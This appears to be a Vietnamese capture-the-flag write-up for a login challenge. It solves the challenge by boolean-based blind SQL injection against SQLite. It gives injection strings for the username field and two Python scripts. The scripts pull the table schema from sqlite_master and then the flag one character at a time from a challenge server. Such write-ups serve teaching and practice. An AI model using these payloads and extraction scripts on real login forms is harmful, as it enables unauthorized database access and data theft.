# Overview
1. Khi ta dùng `username=guest&passwd=guest` thì sẽ output ra cho ta là: `Nothing special here. Maybe an admin account will work?`
2. Khi ta inject: `username=admin'+or+'1'='1&passwd=guest` thì nó vẫn hiện ra output tương tự như trên.
3. Khi ta inject: `username=admin'--&passwd=guest` thì nó output là: `Well done login as admin, but the flag is in another castle`
4. còn nếu inject username sai thì nó sẽ output: `Wrong username or password. Are you a hackẻ?`
=> Bài này sẽ rẽ theo hướng Boolean Base SQLi, vì nó chỉ output ra cho ta kết quả đúng hoặc sai thôi.
Bài này theo hướng error base sẽ hay hơn vì nó hiện error cho chúng ta khi query lỗi. Nhưng mình chọn Boolean Base cho dễ.
# Solution
1. Table này có 2 cột. 
`username=admin'+order+by+2--&passwd=guest`
Và để ý, khi mình `order by 3` nó sẽ output ra lỗi của SQLite.
2. Giờ mình sẽ lấy câu query trong SQLite.
```python
import requests
from string import printable
url = 'http://61.28.237.24:30100/'

sql = ''

for i in range(1,50):
    for j in range(32,127):
        print(f"i\t\t{i}\t\t\t\t\t\t{j}",end='\r')
        resp = requests.post(url, data={
            "username": f"admin' or (select substr(sql,{i},1) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 1) = char({j}) --",
            "passwd": "guest"
        })
        if "Nothing" in resp.text:
            sql += chr(j)
            print(f"query = {sql}")
            break
```
Vì đề có 2 table nên mình sẽ chỉ lấy câu sql của table flag thôi.

![image](https://user-images.githubusercontent.com/46492646/119289912-be031280-bc75-11eb-9508-a71b3118e088.png)

Có table, column rồi thì lấy flag ra thôi.
```python
import requests
from string import printable
url = 'http://61.28.237.24:30100/'

sql = 'CREATE TABLE flagtablewithrandomname(flag)'
flag = ''

for i in range(1,50):
    for j in range(32,127):
        print(f"i\t\t{i}\t\t\t\t\t\t{j}",end='\r')
        resp = requests.post(url, data={
            "username": f"admin' or (select substr(flag,{i},1) FROM flagtablewithrandomname)=char({j})--",
            "passwd": "guest"
        })
        if "Nothing" in resp.text:
            flag += chr(j)
            print(f"query = {flag}")
            break
```

![image](https://user-images.githubusercontent.com/46492646/119290229-5600fc00-bc76-11eb-9819-edededa8c949.png)

